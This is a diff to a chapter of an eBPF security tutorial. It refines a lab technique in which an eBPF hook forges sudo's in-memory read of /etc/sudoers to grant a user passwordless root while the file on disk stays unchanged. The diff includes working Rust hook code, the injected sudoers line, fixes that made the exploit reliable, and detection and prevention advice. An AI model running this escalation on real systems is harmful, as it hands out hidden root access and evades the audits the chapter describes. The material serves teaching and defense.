@@ -20,7 +20,7 @@ and runs it; its `README.md` covers what it does and how to drive it.
 
 {% include excalidraw.html
    file="sudo-escalate"
-   alt="sudo calls read on /etc/sudoers. An eBPF read-exit hook checks whether the current process is named sudo and, if so, overwrites the returned buffer in memory. sudo then sees an injected line and grants root. The file on disk is never touched — only the bytes sudo reads into memory. Defense: the same tells as Chapter 39 (kernel taint, loaded programs), and an LSM can block bpf_probe_write_user."
+   alt="sudo calls read on /etc/sudoers. An eBPF read-exit hook checks whether the current process is named sudo and the returned buffer begins with the sudoers header, and if so overwrites that buffer in memory. sudo then sees an injected line and grants root. The file on disk is never touched — only the bytes sudo reads into memory. Defense: the same tells as Chapter 39 (kernel taint, loaded programs), and an LSM can block bpf_probe_write_user."
    caption="Figure 41.1 — The file on disk is never touched; only the bytes sudo reads are forged" %}
 
 ## Why reads are forgeable
@@ -34,9 +34,12 @@ for that one invocation, leaving the on-disk file pristine and the change
 invisible to anyone who `cat`s it.
 
 The mechanics mirror Chapter 39: capture the buffer on `sys_enter_read`,
-rewrite it on `sys_exit_read` with `bpf_probe_write_user`. The new wrinkle
-is *targeting* — we only want to tamper with `sudo`'s reads, which we do by
-matching the process name.
+rewrite it on `sys_exit_read` with `bpf_probe_write_user`. The new wrinkle is
+*targeting* — and it's subtler than it looks. Matching the process name (`comm
+== "sudo"`) is necessary but nowhere near sufficient; getting it wrong doesn't
+just miss, it **bricks sudo** (see "Why matching `comm` isn't enough" below).
+The reliable target is the read of the sudoers *header*, which we recognize by
+its content.
 
 ## How the code works
 
@@ -64,6 +67,7 @@ against the literal `"sudo"`. Every other process's reads are ignored.
 
 ```rust
 #[map] static PAYLOAD: Array<Payload> = Array::with_max_entries(1, 0); // injected line + len
+#[map] static SIG: Array<Sig> = Array::with_max_entries(1, 0);         // /etc/sudoers header
 
 #[tracepoint] // syscalls:sys_exit_read
 fn on_exit(ctx: &TracePointContext) -> Result<(), ()> {
@@ -71,15 +75,23 @@ fn on_exit(ctx: &TracePointContext) -> Result<(), ()> {
     let key = bpf_get_current_pid_tgid();
     let rc = *unsafe { READS.get(&key) }.ok_or(())?;
     let _ = READS.remove(&key);
+    if ret < SIG_LEN as i64 { return Ok(()); }                          // too short to be the header
 
-    let p = unsafe { PAYLOAD.get(0) }.ok_or(())?;
-    // only tamper a read that actually returned at least our line
-    if ret as u64 >= p.len as u64 && rc.count >= p.len as u64 {
+    // Only tamper a read whose buffer *starts with the sudoers header* — i.e.
+    // a read at file offset 0. Library/ELF reads and mid-file chunks won't match.
+    let sig = SIG.get(0).ok_or(())?;
+    let head = unsafe { bpf_probe_read_user::<[u8; SIG_LEN]>(rc.buf as *const _) }.map_err(|_| ())?;
+    if head != sig.bytes { return Ok(()); }
+
+    let p = PAYLOAD.get(0).ok_or(())?;
+    if p.len == 0 || p.len > 64 { return Ok(()); }                      // clamp to 1..=64 (see note)
+    let len = p.len;
+    if ret as u64 >= len as u64 && rc.count >= len as u64 {
         unsafe {
             bpf_probe_write_user(
                 rc.buf as *mut core::ffi::c_void,
                 p.line.as_ptr() as *const core::ffi::c_void,
-                p.len,
+                len,
             );
         }
         bump(&TAMPERS, 0, 1);
@@ -92,21 +104,54 @@ The pieces:
 
 - We look up the buffer we recorded on entry. Without the enter hook the
   exit handler would only have the byte count, not where the bytes are.
+- The **signature** is the first 16 bytes of `/etc/sudoers`, captured by the
+  loader at startup and stored in `SIG`. We read the same-sized prefix of
+  sudo's buffer and only proceed on a match — that's what pins the tamper to a
+  read of the sudoers *header* and nothing else.
 - The **payload** is a sudoers line like
   `someuser ALL=(ALL:ALL) NOPASSWD:ALL #`, built by the loader and stored in
   a map. It ends in ` #` so that whatever original sudoers content follows it
   in the buffer becomes a trailing comment — the rest of the file still
   parses, but our line is now in force.
 - We **overwrite the first `p.len` bytes** of sudo's buffer with the payload
-  using `bpf_probe_write_user`. We only do it when the read returned at least
-  that many bytes (so we're looking at a real sudoers read, not a tiny one),
-  and we count tampers for telemetry.
+  using `bpf_probe_write_user`, counting tampers for telemetry.
 - `bpf_probe_write_user` is the same **kernel-tainting, lab-only** helper
   from Chapter 39 — using it is itself a detectable event.
 
+> **Verifier note.** The size passed to `bpf_probe_write_user` is
+> `ARG_CONST_SIZE`, so the verifier rejects any length it can't prove is
+> non-zero — a value read from a map has range `[0, u32::MAX]`, and the `0`
+> makes it fail with *"R3 invalid zero-sized read"*. Clamping to `1..=64` (the
+> `p.len == 0 || p.len > 64` guard) gives the verifier the lower bound it needs.
+
 The loader builds the payload for a target user (default a freshly created
-unprivileged account), writes it into `PAYLOAD`, attaches both tracepoints,
-and exports `ebpf_sudo_tampered_total`.
+unprivileged account), captures the sudoers signature into `SIG`, writes the
+payload into `PAYLOAD`, attaches both tracepoints, and exports
+`ebpf_sudo_tampered_total`.
+
+### Why matching `comm` isn't enough
+
+`comm == "sudo"` is the obvious target filter, and it is *catastrophically*
+incomplete. Overwriting every `read()` a `sudo` process makes fails two ways,
+both observed on a live Fedora 44 box:
+
+- **It bricks sudo before it reads any policy.** The dynamic loader `read()`s
+  the ELF headers of shared libraries (`libaudit.so`, …) at process startup,
+  all under `comm == "sudo"`. Smash one and sudo dies with `error while loading
+  shared libraries: /lib64/libaudit.so.1: invalid ELF header`. Worse, since
+  *only* `sudo` reads are corrupted, you can't `sudo pkill` to recover — you've
+  locked yourself out and need an out-of-band root (or a reboot). Matching the
+  sudoers header sidesteps this: an ELF header never looks like `## Sudoers…`.
+- **It misses the parse read.** sudo reads `/etc/sudoers`, then `lseek()`s back
+  to 0 and **re-reads it** for the actual policy parse. Tampering only the
+  first read — or targeting the file descriptor and unmarking it after one
+  hit — leaves that second, authoritative read clean, and nothing escalates.
+  Content-matching wins here for free: the file on disk is never modified, so
+  *every* offset-0 read (validation pass and parse pass alike) still carries
+  the original header and still matches the signature.
+
+The lesson generalizes past this one attack: when you tamper syscall results,
+target by *what the data is*, not by which process or fd produced it.
 
 ## Build, deploy, observe
 
@@ -125,19 +170,25 @@ root — while `cat /etc/sudoers` on disk shows no such line.
 
 The same toolkit as Chapter 39, plus one policy control:
 
-1. **Kernel taint.** `bpf_probe_write_user` sets `TAINT_USER`;
-   `/proc/sys/kernel/tainted` is non-zero and `dmesg` warns once, naming the
-   writer. A program writing into `sudo`'s memory is about as load-bearing an
-   alert as you'll get.
-2. **Unexpected loaded programs.** `sudo bpftool prog show` reveals
+1. **Unexpected loaded programs.** `sudo bpftool prog show` reveals
    tracepoints on `read` — there is no benign reason for one to exist on a
-   server, and enumerating loaded programs is a standing detection.
-3. **Policy that disagrees with behavior.** What `sudo` *granted* doesn't
+   server, and enumerating loaded programs is a standing detection. This is the
+   most reliable tell, and it's the one to lean on (see the taint caveat below).
+2. **Policy that disagrees with behavior.** What `sudo` *granted* doesn't
    match what `/etc/sudoers` *says*; an auditor comparing effective sudo
-   rights against the on-disk policy (or watching for the taint) catches it.
-4. **Prevent the primitive.** An LSM program (Chapters 37, 40) can deny the
+   rights against the on-disk policy catches the divergence even though the
+   file is pristine.
+3. **Prevent the primitive.** An LSM program (Chapters 37, 40) can deny the
    `bpf` operations that load such tools, or restrict `bpf_probe_write_user`
    — defense turning eBPF against the very technique.
+
+> **Don't count on a kernel taint.** Older write-ups (and earlier drafts of
+> this chapter) say `bpf_probe_write_user` flips `/proc/sys/kernel/tainted` and
+> makes `dmesg` warn. On the lab kernel (7.1.3) it does **neither** — verified
+> across many loads: `tainted` stays `0`, `journalctl -k` for the whole boot
+> shows no "may corrupt user memory" line, and no per-call notice appears. The
+> helper is silent here, which is exactly why detection #1 (enumerate loaded
+> programs) rather than a passive taint flag is the one to rely on.
 
 **In Grafana** (`127.0.0.1:3000` → Explore), graph `rate(ebpf_sudo_tampered_total[1m])` — sudoers-tamper events.
 
@@ -157,10 +208,13 @@ the shape of a real runtime-security tool.
 
 ---
 
-*Verification status: <span class="status status--unverified">unverified</span>.
-Confirm on a real Fedora 44 run: the `sys_enter`/`sys_exit_read` argument and
-return offsets (buf @24, count @32, ret @16), that `comm`-matching on `sudo`
-catches the sudoers read, that `bpf_probe_write_user` into sudo's buffer
-actually changes the parsed policy (payload length and the trailing-comment
-padding may need tuning to real sudoers layout), and that
-`/proc/sys/kernel/tainted` flips.*
+*Verification status: <span class="status status--verified">verified — Fedora 44, kernel 7.1.3, sudo 1.9.17p2</span>.
+Built on the host, run on the lab VM. Detached, `victim` cannot sudo; while
+attached, `sudo -u victim sudo -n id` returns `uid=0(root)` on the first
+attempt and sudo itself stays healthy; on detach `victim` is denied again and
+`/etc/sudoers` on disk is unchanged. The original program was rejected by this
+kernel's verifier (`bpf_probe_write_user` size is `ARG_CONST_SIZE` → the
+possibly-zero length failed as "R3 invalid zero-sized read"); the size is now
+clamped to `1..=64`. Targeting was moved from `comm`-only to a sudoers-header
+signature after the `comm`-only version corrupted sudo's shared-library reads
+and missed the `lseek`-rewound parse read (both detailed above).*
